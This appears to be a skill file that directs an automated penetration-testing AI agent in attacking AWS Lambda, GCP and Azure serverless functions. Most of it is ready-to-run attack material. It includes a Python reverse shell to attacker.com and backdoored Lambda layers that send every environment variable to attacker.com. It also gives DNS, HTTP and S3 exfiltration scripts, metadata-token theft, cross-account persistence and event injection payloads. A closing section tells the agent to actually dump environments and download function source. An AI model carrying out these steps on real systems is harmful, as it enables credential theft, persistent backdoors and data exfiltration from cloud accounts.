---
name: serverless-attacks
description: "Serverless function exploitation including Lambda/GCP/Azure Functions abuse, event injection, and environment theft"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["serverless", "lambda", "cloud functions", "azure functions", "function url", "serverless injection", "event injection", "cold start", "serverless security", "faas"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Serverless Top 10", "OWASP Top 10 A03:2021 Injection"]
---

# Serverless Attacks

## When to Use

- Target exposes serverless functions via API Gateway, Function URLs, or HTTP triggers
- Lambda, GCP Cloud Functions, or Azure Functions are identified in responses, headers, or error messages
- Function invocations return verbose errors (stack traces, env dumps, cold-start artifacts)
- Event-driven architecture detected (SQS, S3, EventBridge, Pub/Sub triggers)
- You have captured event payloads or function configuration data

## Do Not Use

- Target is a traditional server — use `injection/` or `recon/recon.md` instead
- No serverless indicators found (no `x-amzn-*` headers, no `server: Google-Forwarded-Proxy`, no function stack traces)
- Engagement rules prohibit cloud-side testing or function invocation
- Functions are behind WAF with rate limiting that blocks repeated invocation attempts

---

## 1. Auth Context

Before attacking serverless functions, capture and validate all available invocation context.

### Capture Sequence

```
1. Inspect HTTP response headers for provider indicators:
   - AWS: x-amzn-RequestId, x-amz-apigw-id, server: AmazonS3, x-amz-function-error
   - GCP: x-cloud-trace-context, server: Google Frontend, x-goog-generation
   - Azure: x-ms-request-id, x-azure-ref, server: Microsoft-IIS/10.0

2. Capture error responses — stack traces, function ARN, handler path, runtime version

3. Identify function trigger type:
   - API Gateway (REST or HTTP API)
   - Function URL (Lambda, Azure Direct Invocation)
   - Event source mapping (SQS, Kinesis, Kafka)
   - Scheduled event (CloudWatch Events, EventBridge, Azure Timer Trigger)

4. Check for IAM role or service account attached to function:
   - AWS: /proc/self/environ, Lambda context object
   - GCP: metadata.google.internal
   - Azure: Managed Identity endpoint, MSI_ENDPOINT
```

### Record Evidence

Log the following without logging secret values:
- Function ARN/name and region
- Runtime (python3.11, nodejs18.x, java17, dotnet6)
- Trigger type and endpoint URL
- IAM role ARN or service account email

---

## 2. Lambda Exploitation

### Environment Variable Theft

Lambda functions commonly store secrets in environment variables. Exploit via:

#### Via Verbose Error Messages

```bash
# Trigger a function error that dumps environment
curl -X POST https://<api-gateway-url>/path \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"constructor": {"prototype": null}}}'
# Prototype pollution or malformed input often triggers error with env context
```

#### Via SSRF to Metadata Service

```bash
# If function makes HTTP requests, inject SSRF to access Lambda runtime API
curl -X POST https://<api-gateway-url>/fetch \
  -d '{"url": "http://localhost:9001/2018-06-01/runtime/invocation/next"}'

# Lambda Runtime API exposes:
# - Full event payload
# - AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# - Function configuration
```

#### Via /proc/self/environ

```bash
# On Linux-based Lambda runtimes, read environment directly
curl "http://localhost:9001/2018-06-01/runtime/invocation/next"
# Response headers include:
#   Lambda-Runtime-Aws-Request-Id
#   Lambda-Runtime-Deadline-Ms
#   Lambda-Runtime-Invoked-Function-Arn
#   Lambda-Runtime-Trace-Id
```

### IAM Role Abuse

Lambda execution roles often have excessive permissions. Enumerate from inside the function:

```bash
# From Lambda context, extract role ARN
# Then use STS to check what the role can do:
aws sts get-caller-identity
aws iam simulate-principal-policy \
  --policy-source-arn <lambda-role-arn> \
  --action-names s3:GetObject,lambda:InvokeFunction,secretsmanager:GetSecretValue

# Common overprivileged Lambda roles:
# - LambdaFullAccess (arn:aws:iam::aws:policy/AWSLambdaFullAccess)
# - AWSLambdaRole (can invoke other functions)
# - Custom policies with s3:*, dynamodb:*, rds:*
```

### /tmp Persistence

Lambda functions have writable /tmp storage (512MB-10GB depending on config). Use for:

```bash
# Write backdoor to /tmp during cold start
# /tmp persists across warm invocations (same execution environment)
# File survives for hours or until function is decommissioned

# Example: persistent credential file
echo '{"stolen_key": "..."}' > /tmp/.cache.json

# Example: reverse shell via /tmp
cat > /tmp/.shell.py << 'EOF'
import socket, subprocess, os
s = socket.socket()
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF
python3 /tmp/.shell.py
```

### Lambda Layer Hijacking

```bash
# Attach a malicious layer to an existing function
# Layers are mounted at /opt and added to PYTHONPATH/NODE_PATH

# Create layer with backdoor
mkdir -p layer/python
cat > layer/python/backdoor.py << 'EOF'
import os, json, urllib.request
def exfiltrate():
    data = {k: v for k, v in os.environ.items()}
    urllib.request.urlopen(
        urllib.request.Request(
            "https://attacker.com/collect",
            data=json.dumps(data).encode(),
            method="POST"
        )
    )
exfiltrate()
EOF
# Layer import runs on cold start before function handler
```

---

## 3. Event Injection

Craft malicious event payloads to manipulate function behavior.

### API Gateway Event Injection

```bash
# Lambda proxy integration passes event directly to handler
# Inject path/query manipulation via crafted event

# Path traversal via URL encoding
GET /../admin/lambda:InvokeFunction HTTP/1.1
Host: <api-gateway-id>.execute-api.<region>.amazonaws.com

# Query string injection
GET /process?callback=http://attacker.com&data=stolen HTTP/1.1

# Body injection with newline characters to manipulate logging
POST /log HTTP/1.1
Content-Type: application/json

{"message": "legitimate\n2024-01-01 INFO /etc/passwd contents: ${cat /etc/passwd}"}
```

### SQS Message Injection

```bash
# Send poisoned message to SQS queue consumed by Lambda
aws sqs send-message \
  --queue-url https://sqs.<region>.amazonaws.com/<account>/<queue> \
  --message-body '{"type":"cleanup","bucket":"attacker-controlled"}'

# If function reads bucket name from message and calls s3:
# Lambda will list/download from attacker's bucket
# or if function uses bucket name in a URL, inject SSRF

# Also try: message body that exploits deserialization
aws sqs send-message \
  --queue-url <queue-url> \
  --message-body '{"__type":"com.amazonaws.dynamodb.v20120810#GetItemInput","tableName":"users","key":{"username":{"S":"admin"}}}'
```

### S3 Event Injection

```bash
# Upload object with crafted key name to trigger function behavior
aws s3 cp payload.json s3://<bucket>/../admin/config.json

# If function uses object key in file path operations:
# ../../etc/cron.d/backdoor

# Event payload structure to exploit:
{
  "Records": [{
    "s3": {
      "object": {
        "key": "../../etc/cron.d/malicious",
        "eTag": "d41d8cd98f00b204e9800998ecf8427e"
      },
      "bucket": {"name": "target-bucket"}
    }
  }]
}
```

### EventBridge / CloudWatch Event Injection

```bash
# If function is triggered by EventBridge rules:
# Craft event matching the rule's event pattern

aws events put-events --entries '[{
  "Source": "custom.order-service",
  "DetailType": "OrderCreated",
  "Detail": "{\"orderId\":\"<>/etc/passwd\",\"action\":\"admin\"}"
}]'
```

---

## 4. Function URL Attacks

Lambda Function URLs and Azure Direct Invocation bypass API Gateway entirely.

### Lambda Function URL Bypass

```bash
# Function URLs have format:
# https://<url-id>.lambda-url.<region>.on.aws/

# Test for public access (no auth)
curl https://<url-id>.lambda-url.<region>.on.aws/
curl https://<url-id>.lambda-url.<region>.on.aws/ -X POST -d '{"admin":true}'

# Auth types:
# - NONE: publicly callable (most dangerous)
# - AWS_IAM: requires SigV4 signing
# - TOKEN: requires bearer token in header

# If AUTH_TYPE is NONE, function is publicly accessible
# Check response headers for x-amzn-RequestId (confirms Lambda)
```

### Azure Functions Direct Invocation

```bash
# Azure Functions have admin/master key endpoints:
# https://<function-name>.azurewebsites.net/admin/functions/<function-name>
# With header: x-functions-key: <master-key>

# Host keys allow invoking any function:
# GET https://<function-name>.azurewebsites.net/admin/host/systemstatus
# Header: x-functions-key: <host-key>

# Enumerate keys via known weaknesses:
# - /admin/functions/ endpoint often leaks in error messages
# - Default host keys may be predictable (first 8 chars of deployment)
```

### Bypassing API Gateway Authentication

```bash
# If function is behind API Gateway, check for direct function URL
# Look for:
# - x-amzn-function-arn in error responses
# - API Gateway logs mentioning direct invocation
# - Function URL in Lambda console configuration

# Invoke directly with proper SigV4 if AWS_IAM auth is enabled:
# Use captured credentials from environment theft
aws lambda invoke \
  --function-name <function-name> \
  --payload '{"direct": true}' \
  --cli-binary-format raw-in-base64-out \
  output.json
```

---

## 5. GCP Cloud Functions Exploitation

### Metadata Access

```bash
# GCP functions access metadata via:
# http://metadata.google.internal/computeMetadata/v1/

curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Returns OAuth2 access token for the function's service account
# Use token to access other GCP services

# Also try:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Then use email to enumerate IAM bindings
```

### Service Account Abuse

```bash
# Once you have service account token, enumerate permissions:
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format="table(bindings.role)" \
  --filter="bindings.members:serviceAccount:<sa-email>"

# Common overprivileged GCP function service accounts:
# - Editor role (roles/editor) on the project
# - Cloud Functions Developer with Editor
# - Custom role with storage.admin, compute.admin

# Use service account to:
# - Access other Cloud Functions source code
# - Read secrets from Secret Manager
# - Access Cloud SQL instances
# - Create new VMs or Cloud Functions
```

### GCP Cloud Functions Source Code Extraction

```bash
# Function source is stored in GCS bucket
# Bucket name format: <project-id>-<region>.cloudfunctions.io

gsutil ls gs://<project-id>-<region>.cloudfunctions.io/

# Download source code of all functions
gsutil cp -r gs://<project-id>-<region>.cloudfunctions.io/<function-name> ./loot/

# Source contains:
# - index.js / main.py (handler code)
# - package.json / requirements.txt (dependencies)
# - .env files (secrets)
# - service-account-key.json (if bundled)
```

---

## 6. Azure Functions Exploitation

### Host Key Theft

```bash
# Azure Functions admin endpoints exposed in error messages:
# /admin/functions - requires host key
# /admin/host/status - returns function keys in some configurations

# Default host key location in deployment:
# D:\home\data\functions\secrets\host.json

# Via SSRF, read host.json to extract master key:
curl http://127.0.0.1:8080/admin/host/systemstatus \
  -H "x-functions-key: <guessed-key>"

# Azure Functions Core Tools local development may expose:
# http://localhost:7071/admin/functions/
```

### ARM Template Injection

```bash
# If function is deployed via ARM template with linked templates:
# The function can execute code during deployment

# Craft ARM template that references attacker-controlled template:
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [{
    "type": "Microsoft.Resources/deployments",
    "apiVersion": "2018-05-01",
    "properties": {
      "templateLink": {
        "uri": "https://attacker.com/malicious-template.json"
      }
    }
  }]
}

# Deploy via:
az deployment group create \
  --resource-group <rg-name> \
  --template-file injection.json
```

### Azure Function App Settings Theft

```bash
# Function App settings include connection strings, API keys, secrets
# Access via Kudu API if authenticated:

curl https://<function-name>.scm.azurewebsites.net/api/settings \
  -H "Authorization: Basic <base64-of-deployment-creds>"

# Or read from environment variables in handler:
# process.env.DATABASE_URL
# process.env.STORAGE_CONNECTION
# process.env.SENDGRID_API_KEY
```

---

## 7. Persistent Backdoor

### Lambda Layer Injection for Persistence

```bash
# Layers persist across invocations and survive function updates
# until explicitly removed

# Create layer that hooks into function initialization
mkdir -p layer/python
cat > layer/python/__init__.py << 'EOF'
import os, json, urllib.request

original_handler = None

def persist():
    """Runs on every cold start"""
    data = {
        "function": os.environ.get("AWS_LAMBDA_FUNCTION_NAME"),
        "role": os.environ.get("AWS_LAMBDA_EXECUTION_ENV"),
        "env": dict(os.environ),
        "region": os.environ.get("AWS_REGION")
    }
    try:
        urllib.request.urlopen(urllib.request.Request(
            "https://attacker.com/beacon",
            data=json.dumps(data).encode(),
            method="POST"
        ))
    except:
        pass

persist()
EOF
```

### Event Source Mapping Persistence

```bash
# Add event source that triggers function on every message
# SQS queue: every message triggers backdoor
aws lambda create-event-source-mapping \
  --function-name <function-name> \
  --event-source-arn arn:aws:sqs:<region>:<account>:<queue-name> \
  --batch-size 1 \
  --maximum-batching-window-inseconds 0

# Kinesis stream: every record triggers function
aws lambda create-event-source-mapping \
  --function-name <function-name> \
  --event-source-arn arn:aws:kinesis:<region>:<account>:stream/<stream-name> \
  --starting-position LATEST
```

### Cross-Account Lambda Invocation Persistence

```bash
# Grant cross-account invoke permission
aws lambda add-permission \
  --function-name <function-name> \
  --statement-id cross-account \
  --action lambda:InvokeFunction \
  --principal <attacker-account-id>

# Attacker can now invoke from their account
aws lambda invoke \
  --function-arn arn:aws:lambda:<region>:<attacker-account>:function:<function-name> \
  --payload '{"cmd":"whoami"}' \
  output.json
```

---

## 8. Data Exfiltration

### DNS Exfiltration

```bash
# Encode data in DNS queries to bypass HTTP monitoring
# Function sends encoded data as subdomain to attacker-controlled DNS server

import base64, socket

def exfil_dns(data):
    encoded = base64.b32encode(data.encode()).decode().lower()
    # Split into 63-char labels (DNS label limit)
    for i in range(0, len(encoded), 63):
        chunk = encoded[i:i+63]
        try:
            socket.getaddrinfo(f"{chunk}.exfil.attacker.com", 80)
        except:
            pass

exfil_dns(json.dumps(os.environ))
```

### HTTP Exfiltration

```bash
# Simple HTTP POST with stolen data
import urllib.request, json, os

data = {
    "function": os.environ.get("AWS_LAMBDA_FUNCTION_NAME"),
    "secrets": {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k or 'TOKEN' in k}
}

req = urllib.request.Request(
    "https://attacker.com/collect",
    data=json.dumps(data).encode(),
    headers={"Content-Type": "application/json"},
    method="POST"
)
urllib.request.urlopen(req)
```

### S3/Cloud Storage Exfiltration

```bash
# Upload stolen data to attacker-controlled S3 bucket
import boto3, os, json

s3 = boto3.client('s3')
data = json.dumps(dict(os.environ)).encode()

s3.put_object(
    Bucket='attacker-controlled-bucket',
    Key=f'exfil/{os.environ["AWS_LAMBDA_FUNCTION_NAME"]}/env.json',
    Body=data,
    ACL='public-read'
)
```

### CloudWatch Logs Exfiltration

```bash
# Log sensitive data to CloudWatch — readable by anyone with logs:DescribeLogGroups
import logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)
logger.info(f"ENV_DUMP: {json.dumps(dict(os.environ))}")

# Attacker reads logs:
aws logs get-log-events \
  --log-group-name /aws/lambda/<function-name> \
  --log-stream-name <stream-name>
```

---

## 9. Anti-Hallucination

### Verify Before Claiming

- **Do not assume** a function is vulnerable — invoke it and verify the error response contains sensitive data
- **Do not assume** environment variables contain secrets — invoke and dump actual environment
- **Do not assume** a function URL is public — test without authentication headers
- **Do not assume** IAM role is overprivileged — use `simulate-principal-policy` with concrete actions
- **Do not assume** source code is accessible — attempt actual download from GCS bucket
- **Do not assume** a function persists — check if it's been decommissioned between invocations

### Evidence Requirements

Every finding must include:
1. The exact function ARN/name, region, and trigger endpoint
2. The invocation request and full response (redact secrets, keep structure)
3. The IAM role ARN or service account email attached to the function
4. The specific overprivileged permission and its AWS/GCP/Azure ARN
5. Timestamp of invocation and cold-start indicators (duration headers)

### Reject Hallucinated Findings

If you cannot invoke the function (403, timeout, function not found), mark the finding as **unverified**. Do not claim a vulnerability exists based on inference alone. The EvidenceGate will reject findings without concrete invocation response evidence.
